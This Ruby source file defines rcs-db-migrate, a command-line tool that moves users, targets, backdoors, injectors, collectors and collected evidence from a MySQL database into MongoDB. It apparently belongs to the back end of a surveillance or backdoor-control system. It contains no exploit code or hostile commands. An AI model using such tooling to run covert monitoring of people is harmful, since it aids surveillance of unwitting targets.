#
#  License handling stuff
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'yaml'
require 'pp'
require 'optparse'

# require all the DB objects
Dir[File.dirname(__FILE__) + '/db_objects/*.rb'].each do |file|
  require file
end

# require all the controllers
Dir[File.dirname(__FILE__) + '/migration/*.rb'].each do |file|
  require file
end

module RCS
module DB

class Migration
  include Singleton
  include RCS::Tracer
  
  def run(options)

    # setup the trace facility
    RCS::DB::Application.trace_setup
    
    # config file parsing
    return 1 unless Config.instance.load_from_file
    
    # connect to MongoDB
    return 1 unless DB.instance.connect

    DB.instance.mysql_connect options[:user], options[:pass], options[:db_address]

    # ensure the sharding is enabled
    DB.instance.enable_sharding

    # start the migration
    unless options[:log]
      Audit.log actor: '<system>', action: 'migration', desc: "Migrating data from #{options[:db_address]}..."
      SignatureMigration.migrate options[:verbose]

      UserMigration.migrate options[:verbose]
      GroupMigration.migrate options[:verbose]
      GroupMigration.migrate_associations options[:verbose]

      ActivityMigration.migrate options[:verbose]
      ActivityMigration.migrate_associations options[:verbose]
      TargetMigration.migrate options[:verbose]
      BackdoorMigration.migrate options[:verbose]
      BackdoorMigration.migrate_associations options[:verbose]
      ConfigMigration.migrate options[:verbose]
      ConfigMigration.migrate_templates options[:verbose]

      AlertMigration.migrate options[:verbose]

      CollectorMigration.migrate options[:verbose]
      CollectorMigration.migrate_topology options[:verbose]

      InjectorMigration.migrate options[:verbose]
      InjectorMigration.migrate_rules options[:verbose]
      Audit.log actor: '<system>', action: 'migration', desc: "Migration of data completed (#{options[:db_address]})"
    end

    if options[:log]
      Audit.log actor: '<system>', action: 'migration', desc: "Migrating evidence of '#{options[:activity]}' from #{options[:db_address]}..."
      LogMigration.migrate(options[:verbose], options[:activity], options[:exclude])
      Audit.log actor: '<system>', action: 'migration', desc: "Migration of evidence completed (#{options[:db_address]})"
    end

    return 0
  end

  # executed from rcs-db-migrate
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      # Set a banner, displayed at the top of the help screen.
      opts.banner = "Usage: rcs-db-migrate [options]"

      opts.on( '-u', '--user USERNAME', 'rcs-db username' ) do |user|
        options[:user] = user
      end
      
      opts.on( '-p', '--password PASSWORD', 'rcs-db password' ) do |password|
        options[:pass] = password
      end
      
      opts.on( '-d', '--db-address HOSTNAME', 'Use the rcs-db at HOSTNAME' ) do |host|
        options[:db_address] = host
      end
      
      opts.on( '-l', '--log ACTIVITY', 'Import logs for a specified activity' ) do |act|
        options[:log] = true
        options[:activity], options[:exclude] = act.split(':')
        options[:exclude] = options[:exclude].split(',') unless options[:exclude].nil?
      end
      
      opts.on( '-v', '--verbose', 'Verbose output' ) do
        options[:verbose] = true
      end

      # This displays the help screen
      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # check mandatory options
    if not options.has_key? :user or not options.has_key? :pass or not options.has_key? :db_address
      puts "Missing arguments for user, password or host."
      return 1
    end
    
    # execute the configurator
    return Migration.instance.run(options)
  end

end #Migration::

end #DB::
end #RCS::
